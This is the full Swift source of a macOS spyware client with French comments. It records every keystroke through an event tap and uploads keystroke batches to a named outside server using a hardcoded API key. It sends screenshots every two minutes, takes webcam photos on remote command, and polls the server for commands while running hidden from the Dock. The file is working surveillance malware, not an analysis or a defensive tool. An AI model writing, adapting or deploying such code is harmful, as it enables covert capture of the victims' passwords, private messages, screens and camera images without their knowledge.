import Foundation
import AppKit
import Carbon 
import CoreGraphics 
import IOKit.hid
import CoreServices 
import Cocoa 
import AVFoundation
import ScreenCaptureKit

// ---------------------------------------------------------------------
// CONFIGURATION
// ---------------------------------------------------------------------

let serverURL = URL(string: "https://api.keylog.claverie.site")!
let apiKey = "72UsPl9QtgelVRbJ44u-G6hcNiSIWx64MEOWcmcCQ" 
let machineID = Host.current().localizedName ?? "Mac-Unknown"
let UserAgent = "KeyloggerClient/2.4" 

let bufferLimit = 10
let timeLimit = 2.0

// ---------------------------------------------------------------------
// GLOBAL STATE
// ---------------------------------------------------------------------

var logBuffer = ""
var lastSendTime = Date()
let bufferLock = NSLock()
var eventTap: CFMachPort?

// Webcam setup
let cameraCaptureDelegate = CameraCaptureDelegate()

// Cache pour le layout clavier
private let currentKeyboard = TISCopyCurrentKeyboardLayoutInputSource().takeRetainedValue()
private let keyboardLayout = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData)
private let keyboardLayoutData = unsafeBitCast(keyboardLayout, to: CFData.self)
private let keyboardLayoutPtr = CFDataGetBytePtr(keyboardLayoutData)

// ---------------------------------------------------------------------
// UTILS - KEYCODE TO CHAR
// ---------------------------------------------------------------------

func getCharFromKeyCode(_ keyCode: UInt16, event: CGEvent) -> String? {
    var keys_modifiers: UInt32 = 0
    if event.flags.contains(.maskShift) { 
        keys_modifiers |= UInt32(shiftKey)
    }
    if event.flags.contains(.maskAlphaShift) { 
        keys_modifiers |= UInt32(alphaLock)
    }

    var stringLength = 0
    var chars: [UniChar] = [0, 0, 0, 0]
    var deadKeyState: UInt32 = 0
    let maxLen = 4

    let layoutPtr = unsafeBitCast(keyboardLayoutPtr, to: UnsafePointer<UCKeyboardLayout>.self)
    
    let status = UCKeyTranslate(
        layoutPtr,
        keyCode,
        UInt16(kUCKeyActionDown),
        UInt32(keys_modifiers >> 8) & 0xFF,
        UInt32(LMGetKbdType()),
        UInt32(kUCKeyTranslateNoDeadKeysBit),
        &deadKeyState,
        maxLen,
        &stringLength,
        &chars
    )
    
    if status == noErr && stringLength > 0 {
        return String(utf16CodeUnits: chars, count: stringLength)
    }
    
    switch Int(keyCode) {
        case 51: return "[BACKSPACE]"
        case 36: return "\n"
        case 49: return " "
        case 53: return "[ESC]"
        case 48: return "[TAB]"
        case 123: return "[LEFT]"
        case 124: return "[RIGHT]"
        case 125: return "[DOWN]"
        case 126: return "[UP]"
        case 117: return "[DEL]"
        case 115: return "[HOME]"
        case 119: return "[END]"
        case 116: return "[PGUP]"
        case 121: return "[PGDN]"
        default: return nil
    }
}

// ---------------------------------------------------------------------
// PARTIE 1: KEYLOGGER
// ---------------------------------------------------------------------

func eventTapCallback(proxy: CGEventTapProxy, type: CGEventType, event: CGEvent, refcon: UnsafeMutableRawPointer?) -> Unmanaged<CGEvent>? {
    if type != .keyDown {
        return Unmanaged.passUnretained(event) 
    }

    let keyCode = UInt16(event.getIntegerValueField(.keyboardEventKeycode))
    let keyString: String = getCharFromKeyCode(keyCode, event: event) ?? "[\(keyCode)]" 

    bufferLock.lock()
    logBuffer += keyString
    
    if logBuffer.count >= bufferLimit || Date().timeIntervalSince(lastSendTime) >= timeLimit {
        DispatchQueue.global(qos: .utility).async {
            sendLogs()
        }
    }
    bufferLock.unlock()

    return Unmanaged.passUnretained(event)
}

func setupEventTap() {
    let eventMask = CGEventMask(1 << CGEventType.keyDown.rawValue)

    eventTap = CGEvent.tapCreate(
        tap: .cgSessionEventTap,
        place: .headInsertEventTap,
        options: .defaultTap,
        eventsOfInterest: eventMask,
        callback: eventTapCallback,
        userInfo: nil
    )

    guard let tap = eventTap else {
        print("Échec de la création du CGEventTap.")
        return
    }
    
    let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0)
    CFRunLoopAddSource(CFRunLoopGetMain(), runLoopSource, .commonModes) 
    
    CGEvent.tapEnable(tap: tap, enable: true) 
    print("Event tap enabled")
}

// ---------------------------------------------------------------------
// PARTIE 2: ENVOI DES TOUCHES
// ---------------------------------------------------------------------

func sendLogs() {
    bufferLock.lock()
    guard !logBuffer.isEmpty else {
        bufferLock.unlock()
        return
    }
    let logs = logBuffer
    logBuffer = ""
    lastSendTime = Date()
    bufferLock.unlock()

    let json: [String: Any] = [
        "machine": machineID,
        "logs": logs
    ]

    guard let data = try? JSONSerialization.data(withJSONObject: json) else { return }

    var req = URLRequest(url: serverURL.appendingPathComponent("/upload_keys"))
    req.httpMethod = "POST"
    req.setValue("application/json", forHTTPHeaderField: "Content-Type")
    req.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
    req.setValue(UserAgent, forHTTPHeaderField: "User-Agent") 

    URLSession.shared.uploadTask(with: req, from: data) { data, response, error in
        guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
            bufferLock.lock()
            logBuffer = logs + logBuffer
            bufferLock.unlock()
            return
        }
        print("[✓] Logs envoyés.")
    }.resume()
}

// ---------------------------------------------------------------------
// PARTIE 3: CAPTURE ET ENVOI D'ÉCRAN
// ---------------------------------------------------------------------

func captureScreenAndConvertToJPEG() -> Data? {
    let semaphore = DispatchSemaphore(value: 0)
    var capturedImage: CGImage?
    
    // Vérifier la disponibilité de ScreenCaptureKit
    guard #available(macOS 12.3, *) else {
        print("[✗] ScreenCaptureKit non disponible sur cette version de macOS.")
        return nil
    }
    
    // Demander l'autorisation si nécessaire
    Task {
        do {
            // Obtenir le contenu disponible
            let content = try await SCShareableContent.excludingDesktopWindows(false, onScreenWindowsOnly: true)
            
            guard let display = content.displays.first else {
                print("[✗] Aucun écran trouvé.")
                semaphore.signal()
                return
            }
            
            // Configuration du filtre
            let filter = SCContentFilter(display: display, excludingWindows: [])
            
            // Configuration de la capture
            let config = SCStreamConfiguration()
            config.width = display.width
            config.height = display.height
            config.pixelFormat = kCVPixelFormatType_32BGRA
            config.scalesToFit = false
            config.showsCursor = true
            
            // Capturer une image
            capturedImage = try await SCScreenshotManager.captureImage(contentFilter: filter, configuration: config)
            
        } catch {
            print("[✗] Erreur lors de la capture: \(error.localizedDescription)")
        }
        semaphore.signal()
    }
    
    // Attendre la fin de la capture
    semaphore.wait()
    
    guard let cgImage = capturedImage else {
        print("[✗] Échec de la capture d'écran.")
        return nil
    }

    let nsImage = NSImage(cgImage: cgImage, size: NSSize(width: cgImage.width, height: cgImage.height))

    guard let tiffData = nsImage.tiffRepresentation,
          let bitmapImage = NSBitmapImageRep(data: tiffData)
    else {
        print("[✗] Échec de la conversion TIFF/Bitmap.")
        return nil
    }
    
    let jpegData = bitmapImage.representation(using: .jpeg, properties: [.compressionFactor: 0.8])
    
    guard let data = jpegData else {
        print("[✗] Échec de l'encodage JPEG.")
        return nil
    }
    
    print("[✓] Capture d'écran effectuée (JPEG, \(data.count) bytes).")
    return data
}

func takeAndUploadScreenshot() {
    DispatchQueue.global(qos: .userInitiated).async {
        guard let dataImage = captureScreenAndConvertToJPEG() else { return }

        let boundary = "Boundary-\(UUID().uuidString)"
        var request = URLRequest(url: serverURL.appendingPathComponent("/upload_screen"))
        request.httpMethod = "POST"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
        request.setValue(UserAgent, forHTTPHeaderField: "User-Agent") 

        var body = Data()

        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"machine\"\r\n\r\n".data(using: .utf8)!)
        body.append(machineID.data(using: .utf8)!)
        body.append("\r\n".data(using: .utf8)!)

        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"file\"; filename=\"screen.jpg\"\r\n".data(using: .utf8)!) 
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(dataImage)
        body.append("\r\n".data(using: .utf8)!)

        body.append("--\(boundary)--\r\n".data(using: .utf8)!)
        
        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                print("[✓] Capture d'écran envoyée.")
            } else {
                print("[✗] Échec de l'envoi de la capture (Code HTTP: \((response as? HTTPURLResponse)?.statusCode ?? 0)).")
            }
        }
        task.resume()
    }
}

// ---------------------------------------------------------------------
// PARTIE 4: CAPTURE WEBCAM
// ---------------------------------------------------------------------

class CameraCaptureDelegate: NSObject, AVCaptureVideoDataOutputSampleBufferDelegate {
    
    private var completionHandler: ((Data?) -> Void)?
    private var captureSession: AVCaptureSession?
    private var hasCapture = false

    func capturePhoto(completion: @escaping (Data?) -> Void) {
        guard AVCaptureDevice.authorizationStatus(for: .video) == .authorized else {
            print("[✗] ACCÈS CAMÉRA REFUSÉ. Tentative de demande d'autorisation...")
            AVCaptureDevice.requestAccess(for: .video) { granted in
                if granted {
                    self.capturePhoto(completion: completion)
                } else {
                    completion(nil)
                }
            }
            return
        }

        self.completionHandler = completion
        self.hasCapture = false
        self.captureSession = AVCaptureSession()
        
        guard let captureDevice = AVCaptureDevice.default(for: .video) else {
            print("[✗] Aucune caméra trouvée.")
            completion(nil)
            return
        }

        do {
            let input = try AVCaptureDeviceInput(device: captureDevice)
            
            if self.captureSession!.canSetSessionPreset(.photo) {
                self.captureSession?.sessionPreset = .photo
            }

            if self.captureSession!.canAddInput(input) {
                self.captureSession?.addInput(input)
            }

            let videoOutput = AVCaptureVideoDataOutput()
            videoOutput.videoSettings = [kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA]
            
            let queue = DispatchQueue(label: "webcam.capture.queue")
            videoOutput.setSampleBufferDelegate(self, queue: queue)
            
            if self.captureSession!.canAddOutput(videoOutput) {
                self.captureSession?.addOutput(videoOutput)
            }
            
            DispatchQueue.global(qos: .userInitiated).async {
                self.captureSession?.startRunning()
            }
        } catch {
            print("[✗] Erreur lors de la configuration de la caméra: \(error.localizedDescription)")
            completion(nil)
        }
    }

    func captureOutput(_ output: AVCaptureOutput, didOutput sampleBuffer: CMSampleBuffer, from connection: AVCaptureConnection) {
        guard !hasCapture else { return }
        hasCapture = true
        
        guard let imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer) else {
            print("[✗] Échec de l'obtention du buffer d'image.")
            cleanup(with: nil)
            return
        }
        
        let ciImage = CIImage(cvPixelBuffer: imageBuffer)
        let context = CIContext()
        
        guard let cgImage = context.createCGImage(ciImage, from: ciImage.extent) else {
            print("[✗] Échec de la conversion CIImage -> CGImage.")
            cleanup(with: nil)
            return
        }
        
        let nsImage = NSImage(cgImage: cgImage, size: NSSize(width: cgImage.width, height: cgImage.height))
        
        guard let tiffData = nsImage.tiffRepresentation,
              let bitmapImage = NSBitmapImageRep(data: tiffData),
              let jpegData = bitmapImage.representation(using: .jpeg, properties: [.compressionFactor: 0.8])
        else {
            print("[✗] Échec de la conversion en JPEG.")
            cleanup(with: nil)
            return
        }
        
        print("[✓] Photo webcam capturée (\(jpegData.count) bytes).")
        cleanup(with: jpegData)
    }
    
    private func cleanup(with data: Data?) {
        DispatchQueue.global(qos: .userInitiated).async {
            self.captureSession?.stopRunning()
        }
        
        self.captureSession = nil
        self.completionHandler?(data)
        self.completionHandler = nil
    }
}

func takeAndUploadWebcamPhoto() {
    print("Tentative de capture webcam...")
    
    cameraCaptureDelegate.capturePhoto { dataImage in
        guard let dataImage = dataImage else { 
            print("[✗] Échec de l'envoi de la photo : données manquantes ou accès refusé.")
            return 
        }

        let boundary = "Boundary-\(UUID().uuidString)"
        var request = URLRequest(url: serverURL.appendingPathComponent("/upload_photo"))
        request.httpMethod = "POST"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
        request.setValue(UserAgent, forHTTPHeaderField: "User-Agent") 

        var body = Data()

        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"machine\"\r\n\r\n".data(using: .utf8)!)
        body.append(machineID.data(using: .utf8)!)
        body.append("\r\n".data(using: .utf8)!)

        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"file\"; filename=\"webcam.jpg\"\r\n".data(using: .utf8)!) 
        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
        body.append(dataImage)
        body.append("\r\n".data(using: .utf8)!)

        body.append("--\(boundary)--\r\n".data(using: .utf8)!)
        
        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                print("[✓] Photo webcam envoyée.")
            } else {
                print("[✗] Échec de l'envoi de la photo (Code HTTP: \((response as? HTTPURLResponse)?.statusCode ?? 0)).")
            }
        }
        task.resume()
    }
}

// ---------------------------------------------------------------------
// PARTIE 5: VÉRIFICATION DES COMMANDES
// ---------------------------------------------------------------------

func checkCommand() {
    let json: [String: Any] = ["machine": machineID]
    guard let data = try? JSONSerialization.data(withJSONObject: json) else { return }

    var req = URLRequest(url: serverURL.appendingPathComponent("/get_command"))
    req.httpMethod = "POST"
    req.setValue("application/json", forHTTPHeaderField: "Content-Type")
    req.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
    req.setValue(UserAgent, forHTTPHeaderField: "User-Agent")
    
    URLSession.shared.uploadTask(with: req, from: data) { data, response, error in
        guard let data = data,
              let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200,
              let jsonResponse = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let cmd = jsonResponse["command"] as? String
        else { return }

        if cmd == "screenshot" {
            takeAndUploadScreenshot() 
        } else if cmd == "webcam" {
            takeAndUploadWebcamPhoto()
        }
    }.resume()
}

// ---------------------------------------------------------------------
// PERMISSIONS + TIMERS
// ---------------------------------------------------------------------

func requestPermissions() {
    print("Accessibility trusted:", AXIsProcessTrusted())
}

func startTimers() {
    // Timer 1: Vérification des commandes toutes les 5.0 secondes
    Timer.scheduledTimer(withTimeInterval: 5.0, repeats: true) { _ in
        checkCommand()
    }
    
    // Timer 2: Envoi des logs toutes les 2.0 secondes
    Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { _ in
        if Date().timeIntervalSince(lastSendTime) >= timeLimit {
            sendLogs()
        }
    }
    
    // NOUVEAU TIMER 3: Capture d'écran automatique toutes les 2 minutes (120.0 secondes)
    Timer.scheduledTimer(withTimeInterval: 120.0, repeats: true) { _ in
        print("Déclenchement de la capture d'écran automatique...")
        takeAndUploadScreenshot()
    }
}

// ---------------------------------------------------------------------
// APP DELEGATE + ENTRY POINT
// ---------------------------------------------------------------------

class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(_ notification: Notification) {
        print("AppKit context OK")
        
        requestPermissions()
        setupEventTap()
        startTimers()
    }
}

let app = NSApplication.shared
let delegate = AppDelegate()
app.delegate = delegate
app.setActivationPolicy(.accessory) 
app.run()